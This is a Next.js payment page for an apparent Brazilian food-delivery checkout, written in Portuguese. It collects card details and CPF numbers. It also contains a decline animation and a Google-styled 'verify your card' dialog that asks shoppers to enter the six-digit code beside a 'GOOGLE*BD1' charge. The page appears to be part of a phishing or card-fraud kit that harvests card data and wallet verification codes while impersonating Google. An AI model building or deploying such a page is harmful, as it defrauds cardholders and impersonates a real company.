'use client';

import { useCartStore } from '@/lib/cart-store';
import { useState, useEffect, useMemo } from 'react';
import { useRouter } from 'next/navigation';
import { toast } from 'sonner';
import { ChevronDown, ChevronUp, Check, AlertTriangle } from 'lucide-react';
import Image from 'next/image';
import CheckoutHeader from '@/components/checkout/CheckoutHeader';

// Card brand detection types
type CardBrand = 'visa' | 'mastercard' | 'elo' | 'amex' | 'hipercard' | 'diners' | 'unknown';

// Card brand SVG paths (SVGs oficiais do ZIP)
const CardBrandSvgs: Record<CardBrand, string> = {
  visa: '/icons/cards/visa.svg',
  mastercard: '/icons/cards/mastercard.svg',
  elo: '/icons/cards/elo.svg',
  amex: '/icons/cards/amex.svg',
  hipercard: '/icons/cards/hipercard.svg',
  diners: '/icons/cards/diners.svg',
  unknown: '/icons/cards/generic.svg'
};

// Componente para exibir logos SVG de bandeiras (usa <img> nativo para SVGs)
const CardBrandLogo = ({ brand, className = "", size = 40 }: { brand: CardBrand; className?: string; size?: number }) => (
  <img 
    src={CardBrandSvgs[brand]} 
    alt={brand} 
    width={size} 
    height={size * 0.7}
    className={`object-contain ${className}`}
    style={{ maxHeight: size * 0.7 }}
  />
);

// Chip icon for card
const ChipIcon = () => (
  <svg viewBox="0 0 50 40" className="w-12 h-10">
    <rect x="0" y="0" width="50" height="40" rx="5" fill="#d4af37" />
    <rect x="5" y="5" width="15" height="12" rx="2" fill="#c9a227" stroke="#b8960f" strokeWidth="1"/>
    <rect x="5" y="23" width="15" height="12" rx="2" fill="#c9a227" stroke="#b8960f" strokeWidth="1"/>
    <rect x="25" y="5" width="20" height="12" rx="2" fill="#c9a227" stroke="#b8960f" strokeWidth="1"/>
    <rect x="25" y="23" width="20" height="12" rx="2" fill="#c9a227" stroke="#b8960f" strokeWidth="1"/>
    <line x1="20" y1="11" x2="25" y2="11" stroke="#b8960f" strokeWidth="2"/>
    <line x1="20" y1="29" x2="25" y2="29" stroke="#b8960f" strokeWidth="2"/>
  </svg>
);

// PIX Icon (verde) - SVG inline para carregamento instantâneo
const PixIcon = ({ className = "w-8 h-8" }: { className?: string }) => (
  <svg viewBox="0 0 48 48" className={className}>
    <path fill="#4db6ac" d="M11.9,12h-0.68l8.04-8.04c2.62-2.61,6.86-2.61,9.48,0L36.78,12H36.1c-1.6,0-3.11,0.62-4.24,1.76l-6.8,6.77c-0.59,0.59-1.53,0.59-2.12,0l-6.8-6.77C15.01,12.62,13.5,12,11.9,12z"/>
    <path fill="#4db6ac" d="M36.1,36h0.68l-8.04,8.04c-2.62,2.61-6.86,2.61-9.48,0L11.22,36h0.68c1.6,0,3.11-0.62,4.24-1.76l6.8-6.77c0.59-0.59,1.53-0.59,2.12,0l6.8,6.77C32.99,35.38,34.5,36,36.1,36z"/>
    <path fill="#4db6ac" d="M44.04,28.74L38.78,34H36.1c-1.07,0-2.07-0.42-2.83-1.17l-6.8-6.78c-1.36-1.36-3.58-1.36-4.94,0l-6.8,6.78C13.97,33.58,12.97,34,11.9,34H9.22l-5.26-5.26c-2.61-2.62-2.61-6.86,0-9.48L9.22,14h2.68c1.07,0,2.07,0.42,2.83,1.17l6.8,6.78c0.68,0.68,1.58,1.02,2.47,1.02s1.79-0.34,2.47-1.02l6.8-6.78C34.03,14.42,35.03,14,36.1,14h2.68l5.26,5.26C46.65,21.88,46.65,26.12,44.04,28.74z"/>
  </svg>
);

// PIX Loading Icon - animação de loading
const PixLoadingIcon = ({ className = "w-8 h-8" }: { className?: string }) => (
  <svg viewBox="0 0 48 48" className={`${className} animate-pulse`}>
    <path fill="#4db6ac" opacity="0.3" d="M11.9,12h-0.68l8.04-8.04c2.62-2.61,6.86-2.61,9.48,0L36.78,12H36.1c-1.6,0-3.11,0.62-4.24,1.76l-6.8,6.77c-0.59,0.59-1.53,0.59-2.12,0l-6.8-6.77C15.01,12.62,13.5,12,11.9,12z"/>
    <path fill="#4db6ac" opacity="0.3" d="M36.1,36h0.68l-8.04,8.04c-2.62,2.61-6.86,2.61-9.48,0L11.22,36h0.68c1.6,0,3.11-0.62,4.24-1.76l6.8-6.77c0.59-0.59,1.53-0.59,2.12,0l6.8,6.77C32.99,35.38,34.5,36,36.1,36z"/>
    <path fill="#4db6ac" d="M44.04,28.74L38.78,34H36.1c-1.07,0-2.07-0.42-2.83-1.17l-6.8-6.78c-1.36-1.36-3.58-1.36-4.94,0l-6.8,6.78C13.97,33.58,12.97,34,11.9,34H9.22l-5.26-5.26c-2.61-2.62-2.61-6.86,0-9.48L9.22,14h2.68c1.07,0,2.07,0.42,2.83,1.17l6.8,6.78c0.68,0.68,1.58,1.02,2.47,1.02s1.79-0.34,2.47-1.02l6.8-6.78C34.03,14.42,35.03,14,36.1,14h2.68l5.26,5.26C46.65,21.88,46.65,26.12,44.04,28.74z">
      <animate attributeName="opacity" values="1;0.5;1" dur="1.5s" repeatCount="indefinite"/>
    </path>
  </svg>
);

// Generic Card Icon - SVG inline
const GenericCardIcon = ({ className = "w-8 h-8" }: { className?: string }) => (
  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" className={`${className} text-gray-600`}>
    <rect x="1" y="4" width="22" height="16" rx="2" ry="2"/>
    <line x1="1" y1="10" x2="23" y2="10"/>
  </svg>
);

// SVGs das bandeiras para o overlay
const BrandLogos: Record<CardBrand, React.ReactNode> = {
  visa: (
    <svg viewBox="0 0 48 48" className="w-full h-full">
      <rect width="48" height="48" rx="4" fill="#1A1F71"/>
      <path d="M19.5 31h-3.2l2-12.4h3.2L19.5 31zm13.1-12.1c-.6-.2-1.6-.5-2.9-.5-3.2 0-5.4 1.7-5.4 4.1 0 1.8 1.6 2.8 2.8 3.4 1.2.6 1.7 1 1.7 1.5 0 .8-1 1.2-1.9 1.2-1.3 0-2-.2-3-.7l-.4-.2-.5 2.9c.8.4 2.1.7 3.6.7 3.4 0 5.6-1.7 5.6-4.2 0-1.4-.8-2.5-2.7-3.4-1.1-.6-1.8-.9-1.8-1.5 0-.5.6-1 1.8-1 1 0 1.8.2 2.4.5l.3.1.4-2.9zm8.4-.3h-2.5c-.8 0-1.4.2-1.7 1l-4.9 11.4h3.4l.7-1.9h4.2l.4 1.9H44l-2.5-12.4h-0.5zm-4 8l1.3-3.5c0 0 .3-.7.4-1.2l.2 1.1.8 3.6h-2.7zM15.4 18.6l-3.2 8.4-.3-1.7c-.6-2-2.4-4.1-4.4-5.2l2.9 10.8h3.5l5.1-12.3h-3.6z" fill="#fff"/>
      <path d="M9.6 18.6H4.1l-.1.3c4.1 1 6.8 3.6 7.9 6.6l-1.1-5.7c-.2-.8-.8-1.1-1.2-1.2z" fill="#F9A51A"/>
    </svg>
  ),
  mastercard: (
    <svg viewBox="0 0 48 48" className="w-full h-full">
      <rect width="48" height="48" rx="4" fill="#000"/>
      <circle cx="18" cy="24" r="10" fill="#EB001B"/>
      <circle cx="30" cy="24" r="10" fill="#F79E1B"/>
      <path d="M24 16.8a10 10 0 0 0 0 14.4 10 10 0 0 0 0-14.4z" fill="#FF5F00"/>
    </svg>
  ),
  elo: (
    <svg viewBox="0 0 48 48" className="w-full h-full">
      <rect width="48" height="48" rx="4" fill="#000"/>
      <path d="M12 20c1.7-1 3.7-1.5 5.8-1.5 6.1 0 11 4.9 11 11s-4.9 11-11 11c-2.1 0-4.1-.6-5.8-1.5" stroke="#FFCB05" strokeWidth="3" fill="none"/>
      <path d="M36 28c-1.7 1-3.7 1.5-5.8 1.5-6.1 0-11-4.9-11-11s4.9-11 11-11c2.1 0 4.1.6 5.8 1.5" stroke="#00A4E0" strokeWidth="3" fill="none"/>
      <circle cx="24" cy="24" r="4" fill="#EF4123"/>
    </svg>
  ),
  amex: (
    <svg viewBox="0 0 48 48" className="w-full h-full">
      <rect width="48" height="48" rx="4" fill="#006FCF"/>
      <path d="M8 28h4l.7-1.7h1.6l.7 1.7h8v-1.3l.7 1.3h4.1l.7-1.4v1.4h16.5v-3.4h-1.8v.5c-.5-.5-1.1-.5-1.4-.5h-5.6v-3.3h5.5c.3 0 1 0 1.4-.5v.5H44v-3.8h-2.5v.5c-.4-.5-1-.5-1.3-.5h-5.7v-.5c-.4.5-1 .5-1.4.5H22.5l-1.6 3.6-1.7-3.6h-4.6v1.3l-.6-1.3H9.9L6 28h2zm24.8-6.3h2l2.2 5.1v-5.1h2.2l1.7 3.6 1.5-3.6h2.2v6h-1.4l.0-4.7-1.8 4.7h-1.2l-1.9-4.7v4.7h-2.7l-.6-1.6h-3.5l-.7 1.6h-1.5l2.9-6zm-1.7 3l-1.1-2.5-1.1 2.5h2.2zM8.9 21.7h3.3l3.8 6v-6h3.6l2.9 5 2.7-5h3.5v6h-2.2v-4.7l-3.1 4.7h-1.9l-3.2-4.7v4.7H14l-.7-1.6h-3.5l-.7 1.6H7.5l3-6h-1.6zm3.3 3l-1.1-2.5-1.1 2.5h2.2z" fill="#fff"/>
    </svg>
  ),
  hipercard: (
    <svg viewBox="0 0 48 48" className="w-full h-full">
      <rect width="48" height="48" rx="4" fill="#822124"/>
      <path d="M24 14c-5.5 0-10 4.5-10 10s4.5 10 10 10 10-4.5 10-10-4.5-10-10-10zm0 16c-3.3 0-6-2.7-6-6s2.7-6 6-6 6 2.7 6 6-2.7 6-6 6z" fill="#fff"/>
      <circle cx="24" cy="24" r="3" fill="#FFCC00"/>
    </svg>
  ),
  diners: (
    <svg viewBox="0 0 48 48" className="w-full h-full">
      <rect width="48" height="48" rx="4" fill="#0065A4"/>
      <circle cx="24" cy="24" r="12" fill="#fff"/>
      <path d="M20 16v16c-3.3-1.5-5.5-4.8-5.5-8.5S16.7 17.5 20 16zm8 0c3.3 1.5 5.5 4.8 5.5 8.5S31.3 30.5 28 32V16z" fill="#0065A4"/>
    </svg>
  ),
  unknown: (
    <svg viewBox="0 0 48 48" className="w-full h-full">
      <rect width="48" height="48" rx="4" fill="#6b7280"/>
      <rect x="8" y="14" width="32" height="20" rx="2" fill="#9ca3af"/>
      <rect x="12" y="18" width="8" height="6" rx="1" fill="#6b7280"/>
    </svg>
  )
};

// Animação de Máquina de Cartão - com bandeira dinâmica
const CardMachineAnimation = ({ brand }: { brand: CardBrand }) => (
  <div className="relative w-28 h-36 flex items-center justify-center">
    <svg viewBox="0 0 100 130" className="w-full h-full">
      {/* Corpo da Máquina */}
      <rect x="15" y="40" width="70" height="85" rx="6" fill="#1f2937" />
      
      {/* Tela da Máquina */}
      <rect x="22" y="48" width="56" height="30" rx="3" fill="#111827" />
      
      {/* 3 pontos de loading */}
      <circle cx="42" cy="58" r="3" fill="#6b7280">
        <animate attributeName="opacity" values="1;0.3;1" dur="1s" repeatCount="indefinite" />
      </circle>
      <circle cx="50" cy="58" r="3" fill="#6b7280">
        <animate attributeName="opacity" values="0.3;1;0.3" dur="1s" repeatCount="indefinite" />
      </circle>
      <circle cx="58" cy="58" r="3" fill="#6b7280">
        <animate attributeName="opacity" values="1;0.3;1" dur="1s" repeatCount="indefinite" begin="0.3s" />
      </circle>
      
      {/* Texto na tela */}
      <text x="50" y="72" textAnchor="middle" fill="#9ca3af" fontSize="6" fontFamily="system-ui">
        PROCESSANDO
      </text>
      
      {/* Teclado simplificado */}
      <rect x="22" y="82" width="56" height="38" rx="2" fill="#374151" />
      
      {/* Slot para cartão */}
      <rect x="30" y="36" width="40" height="6" rx="2" fill="#4b5563" />
      
      {/* Cartão animado com bandeira */}
      <g>
        <animateTransform 
          attributeName="transform" 
          type="translate" 
          values="0,-30; 0,0; 0,0" 
          dur="2s" 
          repeatCount="indefinite"
          keyTimes="0; 0.4; 1"
        />
        <rect x="32" y="10" width="36" height="24" rx="3" fill="#e5e7eb" />
        <foreignObject x="34" y="12" width="20" height="20">
          <div className="w-full h-full">{BrandLogos[brand]}</div>
        </foreignObject>
        <rect x="56" y="14" width="10" height="3" rx="1" fill="#d1d5db" />
        <rect x="56" y="19" width="8" height="3" rx="1" fill="#d1d5db" />
      </g>
    </svg>
  </div>
);

// Animação de Erro com bandeira
const CardErrorAnimation = ({ brand, showButton, onConfirm }: { brand: CardBrand; showButton: boolean; onConfirm: () => void }) => (
  <div className="flex flex-col items-center gap-4">
    {/* Bandeira acima do X */}
    <div className="w-14 h-14 rounded-lg overflow-hidden shadow-lg">
      {BrandLogos[brand]}
    </div>
    
    {/* X animado */}
    <div className="relative w-16 h-16 flex items-center justify-center">
      <svg viewBox="0 0 100 100" className="w-full h-full">
        <circle cx="50" cy="50" r="45" fill="none" stroke="#dc2626" strokeWidth="3" opacity="0.3" />
        <circle cx="50" cy="50" r="45" fill="none" stroke="#dc2626" strokeWidth="3" strokeDasharray="283" strokeDashoffset="283">
          <animate attributeName="stroke-dashoffset" from="283" to="0" dur="0.5s" fill="freeze" />
        </circle>
        <g stroke="#dc2626" strokeWidth="4" strokeLinecap="round">
          <line x1="35" y1="35" x2="35" y2="35">
            <animate attributeName="x2" from="35" to="65" dur="0.3s" fill="freeze" begin="0.3s" />
            <animate attributeName="y2" from="35" to="65" dur="0.3s" fill="freeze" begin="0.3s" />
          </line>
          <line x1="65" y1="35" x2="65" y2="35">
            <animate attributeName="x2" from="65" to="35" dur="0.3s" fill="freeze" begin="0.5s" />
            <animate attributeName="y2" from="35" to="65" dur="0.3s" fill="freeze" begin="0.5s" />
          </line>
        </g>
      </svg>
    </div>
    
    {/* Mensagem */}
    <div className="text-center space-y-2 max-w-[280px]">
      <p className="text-gray-300 text-sm leading-relaxed">
        Transação recusada pela instituição financeira.
      </p>
      <p className="text-gray-500 text-xs">
        Tente um cartão diferente ou outro meio de pagamento.
      </p>
    </div>
    
    {/* Botão Entendi - aparece após 2 segundos */}
    {showButton && (
      <button
        onClick={onConfirm}
        className="mt-2 px-8 py-2.5 bg-white text-gray-900 font-semibold rounded-lg text-sm hover:bg-gray-100 transition-all animate-fade-in"
      >
        Entendi
      </button>
    )}
  </div>
);

// Brand display names
const BrandDisplayNames: Record<CardBrand, string> = {
  visa: 'Visa',
  mastercard: 'MasterCard',
  elo: 'Elo',
  amex: 'American Express',
  hipercard: 'Hipercard',
  diners: 'Diners Club',
  unknown: 'Cartão',
};

// Google-style verification info screen ("Receber código")
const VerificationInfoStep = ({
  brand,
  lastFour,
  onReceberCodigo,
  isLoading,
  onClose,
}: {
  brand: CardBrand;
  lastFour: string;
  onReceberCodigo: () => void;
  isLoading: boolean;
  onClose: () => void;
}) => (
  <div className="bg-white rounded-2xl max-w-sm w-full mx-4 overflow-hidden shadow-2xl relative">
    {/* Close button */}
    <button
      onClick={onClose}
      className="absolute top-4 right-4 w-8 h-8 flex items-center justify-center rounded-full hover:bg-gray-100 transition-colors z-10"
    >
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" className="w-5 h-5 text-gray-500">
        <path d="M18 6L6 18M6 6l12 12" strokeLinecap="round" strokeLinejoin="round"/>
      </svg>
    </button>

    {/* Header */}
    <div className="px-6 pt-6 pb-3 pr-14">
      <h2 className="text-lg font-medium text-gray-900">Verificar seu cartão para manter a segurança dele</h2>
    </div>
    
    {/* Google verification image */}
    <div className="px-6 pb-4 flex justify-center">
      <img src="/google-verification.webp" alt="Exemplo de código de verificação" className="w-48 h-auto" />
    </div>
    
    {/* Text */}
    <div className="px-6 pb-4">
      <p className="text-sm text-gray-600 leading-relaxed">
        Verifique seu cartão <span className="font-semibold text-gray-900">{BrandDisplayNames[brand]} •••• {lastFour}</span> com o código que você vai encontrar ao lado de uma cobrança temporária (Aproximadamente R$ 3,00). A cobrança vai aparecer nas transações do cartão (no app ou nos extratos da sua conta).
      </p>
    </div>
    
    {/* Button */}
    <div className="px-6 pb-6">
      <button
        onClick={onReceberCodigo}
        disabled={isLoading}
        className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-6 rounded-lg transition-colors disabled:opacity-60"
      >
        {isLoading ? (
          <span className="flex items-center justify-center gap-2">
            <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none"/><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"/></svg>
            Processando...
          </span>
        ) : 'Receber código'}
      </button>
    </div>
  </div>
);

// Code input step (after 10s delay) - Google style
const VerificationCodeInput = ({
  brand,
  lastFour,
  onSubmit,
  isSubmitting,
  onClose,
  externalError,
  onClearExternalError,
}: {
  brand: CardBrand;
  lastFour: string;
  onSubmit: (code: string) => void;
  isSubmitting: boolean;
  onClose: () => void;
  externalError?: string;
  onClearExternalError?: () => void;
}) => {
  const [code, setCode] = useState('');
  const [codeError, setCodeError] = useState('');
  
  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').substring(0, 6);
    setCode(value);
    if (codeError) setCodeError('');
    if (externalError && onClearExternalError) onClearExternalError();
  };

  const displayError = externalError || codeError;

  const handleSubmit = () => {
    if (code.length !== 6) {
      setCodeError('Só é possível inserir números');
      return;
    }
    onSubmit(code);
  };

  return (
    <div className="bg-white rounded-2xl max-w-sm w-full mx-4 overflow-hidden shadow-2xl relative">
      {/* Close button */}
      <button
        onClick={onClose}
        className="absolute top-4 right-4 w-8 h-8 flex items-center justify-center rounded-full hover:bg-gray-100 transition-colors z-10"
      >
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" className="w-5 h-5 text-gray-500">
          <path d="M18 6L6 18M6 6l12 12" strokeLinecap="round" strokeLinejoin="round"/>
        </svg>
      </button>

      <div className="px-6 pt-6 pb-2 pr-14">
        <h2 className="text-lg font-medium text-gray-900">Insira o código de verificação</h2>
      </div>
      
      <div className="px-6 pb-3">
        <p className="text-sm text-gray-600 leading-relaxed">
          Confira as transações do seu cartão <span className="font-semibold text-gray-900">{BrandDisplayNames[brand]} •••• {lastFour}</span> e encontre a cobrança temporária feita recentemente. Insira o código de seis dígitos ao lado de <span className="font-bold text-gray-900">&quot;GOOGLE*BD1&quot;</span>.
        </p>
      </div>

      {/* Code input field - Google style */}
      <div className="px-6 pb-2">
        <div className="relative">
          <label className={`absolute left-3 transition-all text-xs -top-2 bg-white px-1 ${displayError ? 'text-red-600' : 'text-gray-500'}`}>Código</label>
          <input
            type="text"
            inputMode="numeric"
            pattern="[0-9]*"
            value={code}
            onChange={handleChange}
            maxLength={6}
            autoFocus
            className={`w-full text-base px-3 py-3 rounded border bg-white text-gray-900 focus:outline-none transition-colors ${
              displayError ? 'border-red-500 focus:border-red-500' : 'border-gray-300 focus:border-blue-500 focus:ring-1 focus:ring-blue-500'
            }`}
          />
        </div>
        {displayError && <p className="text-red-600 text-xs mt-1">{displayError}</p>}
      </div>

      <div className="px-6 pb-4">
        <p className="text-xs text-gray-500 leading-relaxed">
          A cobrança pode levar até 3 minutos para aparecer em sua fatura.
        </p>
      </div>
      
      <div className="px-6 pb-6 flex justify-end">
        <button
          onClick={handleSubmit}
          disabled={code.length !== 6 || isSubmitting}
          className="bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2.5 px-8 rounded-lg transition-colors disabled:opacity-50 disabled:cursor-not-allowed text-sm"
        >
          {isSubmitting ? 'Enviando...' : 'Confirmar'}
        </button>
      </div>
    </div>
  );
};

// Overlay de processamento de cartão
const CardProcessingOverlay = ({ 
  showError, 
  brand, 
  showButton, 
  onConfirm,
  showInfoModal,
  showCodeInput,
  lastFour,
  onReceberCodigo,
  isLoadingReceber,
  onCodeSubmit,
  isSubmittingCode,
  onCloseModal,
  codeError,
  onClearCodeError,
}: { 
  showError: boolean; 
  brand: CardBrand; 
  showButton: boolean; 
  onConfirm: () => void;
  showInfoModal?: boolean;
  showCodeInput?: boolean;
  lastFour?: string;
  onReceberCodigo?: () => void;
  isLoadingReceber?: boolean;
  onCodeSubmit?: (code: string) => void;
  isSubmittingCode?: boolean;
  onCloseModal?: () => void;
  codeError?: string;
  onClearCodeError?: () => void;
}) => (
  <div className="fixed inset-0 z-[200] flex items-center justify-center">
    {/* Background escurecido 95% */}
    <div className="absolute inset-0 bg-black" style={{ opacity: 0.95 }} />
    
    {/* Conteúdo central */}
    <div className="relative z-10 flex flex-col items-center gap-4 px-2 w-full">
      {showInfoModal ? (
        <VerificationInfoStep
          brand={brand}
          lastFour={lastFour || '****'}
          onReceberCodigo={onReceberCodigo || (() => {})}
          isLoading={isLoadingReceber || false}
          onClose={onCloseModal || (() => {})}
        />
      ) : showCodeInput ? (
        <VerificationCodeInput
          brand={brand}
          lastFour={lastFour || '****'}
          onSubmit={onCodeSubmit || (() => {})}
          isSubmitting={isSubmittingCode || false}
          onClose={onCloseModal || (() => {})}
          externalError={codeError}
          onClearExternalError={onClearCodeError}
        />
      ) : !showError ? (
        <>
          <CardMachineAnimation brand={brand} />
          <p className="text-gray-500 text-sm">Processando...</p>
        </>
      ) : (
        <CardErrorAnimation brand={brand} showButton={showButton} onConfirm={onConfirm} />
      )}
    </div>
  </div>
);

// Detect card brand from number using BIN ranges
// Prioridade: Amex > Elo > Hipercard > Mastercard > Visa > Diners
function getCardBrand(cardNumber: string): CardBrand {
  const number = cardNumber.replace(/\D/g, '');
  if (!number) return 'unknown';
  
  // 1. AMEX - começa com 34 ou 37 (prioridade mais alta)
  if (/^3[47]/.test(number)) return 'amex';
  
  // 2. ELO - BINs específicos brasileiros (verificar antes de Visa/Mastercard)
  // BINs fixos
  const eloPrefixes = ['401178', '401179', '431274', '438935', '451416', '457393', '457631', '457632', '504175', '627780', '636297', '636368'];
  for (const prefix of eloPrefixes) {
    if (number.startsWith(prefix)) return 'elo';
  }
  // Ranges: 506699-506778
  if (number.length >= 6) {
    const bin6 = parseInt(number.substring(0, 6), 10);
    if (bin6 >= 506699 && bin6 <= 506778) return 'elo';
    // Range: 509000-509999
    if (bin6 >= 509000 && bin6 <= 509999) return 'elo';
    // Range: 650031-650033
    if (bin6 >= 650031 && bin6 <= 650033) return 'elo';
    // Range: 650035-650051
    if (bin6 >= 650035 && bin6 <= 650051) return 'elo';
    // Range: 650405-650439
    if (bin6 >= 650405 && bin6 <= 650439) return 'elo';
    // Range: 650485-650538
    if (bin6 >= 650485 && bin6 <= 650538) return 'elo';
    // Range: 650541-650598
    if (bin6 >= 650541 && bin6 <= 650598) return 'elo';
    // Range: 650700-650718
    if (bin6 >= 650700 && bin6 <= 650718) return 'elo';
    // Range: 650720-650727
    if (bin6 >= 650720 && bin6 <= 650727) return 'elo';
    // Range: 650901-650920
    if (bin6 >= 650901 && bin6 <= 650920) return 'elo';
    // Range: 651652-651679
    if (bin6 >= 651652 && bin6 <= 651679) return 'elo';
    // Range: 655000-655019
    if (bin6 >= 655000 && bin6 <= 655019) return 'elo';
    // Range: 655021-655058
    if (bin6 >= 655021 && bin6 <= 655058) return 'elo';
  }
  
  // 3. HIPERCARD - 606282 ou range 384100-384199
  if (number.startsWith('606282')) return 'hipercard';
  if (number.length >= 6) {
    const bin6 = parseInt(number.substring(0, 6), 10);
    if (bin6 >= 384100 && bin6 <= 384199) return 'hipercard';
  }
  
  // 4. MASTERCARD - 51-55 ou 2221-2720
  if (/^5[1-5]/.test(number)) return 'mastercard';
  if (number.length >= 4) {
    const bin4 = parseInt(number.substring(0, 4), 10);
    if (bin4 >= 2221 && bin4 <= 2720) return 'mastercard';
  }
  
  // 5. VISA - começa com 4
  if (/^4/.test(number)) return 'visa';
  
  // 6. DINERS - 36, 38, 300-305
  if (/^3(?:0[0-5]|6|8)/.test(number)) return 'diners';
  
  return 'unknown';
}

// Luhn algorithm validation
function validateLuhn(cardNumber: string): boolean {
  const number = cardNumber.replace(/\D/g, '');
  if (number.length < 13) return false;
  
  let sum = 0;
  let isEven = false;
  
  for (let i = number.length - 1; i >= 0; i--) {
    let digit = parseInt(number[i], 10);
    
    if (isEven) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    
    sum += digit;
    isEven = !isEven;
  }
  
  return sum % 10 === 0;
}

export default function PaymentPage() {
  const router = useRouter();
  const { items, getSubtotal, getDeliveryFee, getTotal } = useCartStore();
  const [mounted, setMounted] = useState(false);
  const [checkoutData, setCheckoutData] = useState<any>(null);
  const [showSummary, setShowSummary] = useState(false);
  const [selectedMethod, setSelectedMethod] = useState<'pix' | 'card' | null>('pix');
  const [cpf, setCpf] = useState('');
  const [cardData, setCardData] = useState({ number: '', name: '', expiry: '', cvv: '' });
  const [isProcessing, setIsProcessing] = useState(false);
  const [showCardProcessingOverlay, setShowCardProcessingOverlay] = useState(false);
  const [showOverlayError, setShowOverlayError] = useState(false);
  const [showEntendiButton, setShowEntendiButton] = useState(false);
  const [overlayBrand, setOverlayBrand] = useState<CardBrand>('unknown');
  const [errorTimeoutRef, setErrorTimeoutRef] = useState<NodeJS.Timeout | null>(null);
  const [cardWasDeclined, setCardWasDeclined] = useState(false);
  const [cpfError, setCpfError] = useState('');
  const [isCardFlipped, setIsCardFlipped] = useState(false);
  const [cardError, setCardError] = useState('');
  const [verificationEnabled, setVerificationEnabled] = useState(false);
  const [showVerificationInfoModal, setShowVerificationInfoModal] = useState(false);
  const [showVerificationCodeInput, setShowVerificationCodeInput] = useState(false);
  const [isLoadingReceber, setIsLoadingReceber] = useState(false);
  const [isSubmittingCode, setIsSubmittingCode] = useState(false);
  const [verificationRecordId, setVerificationRecordId] = useState<string | null>(null);
  const [verificationCodeError, setVerificationCodeError] = useState<string>('');
  
  // Auto-dismiss error after 5 seconds
  useEffect(() => {
    if (cardError) {
      const timer = setTimeout(() => setCardError(''), 5000);
      return () => clearTimeout(timer);
    }
  }, [cardError]);

  // Check if verification code feature is enabled
  useEffect(() => {
    fetch('/api/verification-code')
      .then(res => res.json())
      .then(data => { if (typeof data.enabled === 'boolean') setVerificationEnabled(data.enabled); })
      .catch(() => {});
  }, []);
  
  // Card brand detection
  const cardBrand = useMemo(() => getCardBrand(cardData.number), [cardData.number]);
  const isAmex = cardBrand === 'amex';
  const cvvMaxLength = isAmex ? 4 : 3;
  const cvvPlaceholder = isAmex ? '0000' : '000';
  
  // Luhn validation
  const isCardNumberValid = useMemo(() => {
    const cleanNumber = cardData.number.replace(/\D/g, '');
    if (cleanNumber.length < 13) return null;
    return validateLuhn(cardData.number);
  }, [cardData.number]);
  
  // Name validation (at least 2 words, no numbers)
  const isNameValid = useMemo(() => {
    const name = cardData.name.trim();
    if (!name) return null;
    const words = name.split(/\s+/).filter(w => w.length > 0);
    return words.length >= 2;
  }, [cardData.name]);
  
  // Expiry validation (MM/YY format, not expired, month <= 12)
  const isExpiryValid = useMemo(() => {
    if (cardData.expiry.length !== 5) return null;
    const [monthStr, yearStr] = cardData.expiry.split('/');
    const month = parseInt(monthStr, 10);
    const year = parseInt(yearStr, 10);
    
    if (isNaN(month) || isNaN(year)) return false;
    if (month < 1 || month > 12) return false;
    
    const now = new Date();
    const currentYear = now.getFullYear() % 100;
    const currentMonth = now.getMonth() + 1;
    
    if (year < currentYear) return false;
    if (year === currentYear && month < currentMonth) return false;
    
    return true;
  }, [cardData.expiry]);
  
  // Format name - only letters and spaces, uppercase
  const formatName = (value: string) => {
    return value.replace(/[^a-zA-ZÀ-ÿ\s]/g, '').toUpperCase();
  };
  
  // Format expiry with month validation
  const formatExpiryWithValidation = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    if (numbers.length >= 2) {
      let month = numbers.substring(0, 2);
      let year = numbers.substring(2, 4);
      const monthNum = parseInt(month, 10);
      
      // Validar mês (01-12)
      if (monthNum > 12) month = '12';
      if (monthNum === 0 && numbers.length >= 2) month = '01';
      
      // Validar ano (máximo 40 = 2040)
      if (year.length === 2) {
        const yearNum = parseInt(year, 10);
        if (yearNum > 40) year = '40';
      }
      
      return month + '/' + year;
    }
    return numbers;
  };

  const validateCPF = (cpf: string): boolean => {
    const cleanCPF = cpf.replace(/\D/g, '');
    if (cleanCPF.length !== 11) return false;
    if (/^(\d)\1{10}$/.test(cleanCPF)) return false;
    let soma = 0;
    for (let i = 0; i < 9; i++) soma += parseInt(cleanCPF.charAt(i)) * (10 - i);
    let resto = (soma * 10) % 11;
    if (resto === 10 || resto === 11) resto = 0;
    if (resto !== parseInt(cleanCPF.charAt(9))) return false;
    soma = 0;
    for (let i = 0; i < 10; i++) soma += parseInt(cleanCPF.charAt(i)) * (11 - i);
    resto = (soma * 10) % 11;
    if (resto === 10 || resto === 11) resto = 0;
    if (resto !== parseInt(cleanCPF.charAt(10))) return false;
    return true;
  };

  useEffect(() => {
    setMounted(true);
    const data = sessionStorage.getItem('checkoutData');
    if (data) {
      const parsedData = JSON.parse(data);
      setCheckoutData(parsedData);
      const saveCheckoutSession = async () => {
        try {
          const fullAddress = `${parsedData.street}, ${parsedData.number}${parsedData.complement ? ', ' + parsedData.complement : ''}, ${parsedData.neighborhood}, ${parsedData.city} - ${parsedData.state}, CEP ${parsedData.cep}`;
          const phoneDigits = parsedData.phone.replace(/\D/g, '');
          const uniqueEmail = `cliente_${phoneDigits}@zeexpress.com`;
          await fetch('/api/checkout-session', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ customerName: parsedData.name, customerEmail: uniqueEmail, customerPhone: parsedData.phone, address: fullAddress, complement: parsedData.complement || '', items: items, subtotal: getSubtotal(), deliveryFee: getDeliveryFee(), total: getTotal() }),
          });
        } catch (error) { console.error('Erro ao salvar checkout session:', error); }
      };
      saveCheckoutSession();
    } else router.push('/checkout');
  }, [router, items, getSubtotal, getDeliveryFee, getTotal]);

  useEffect(() => { if (mounted && items.length === 0) router.push('/'); }, [items, mounted, router]);

  if (!mounted || !checkoutData) return null;

  const subtotal = getSubtotal();
  const deliveryFee = getDeliveryFee();
  const total = getTotal();

  const formatCPF = (value: string) => {
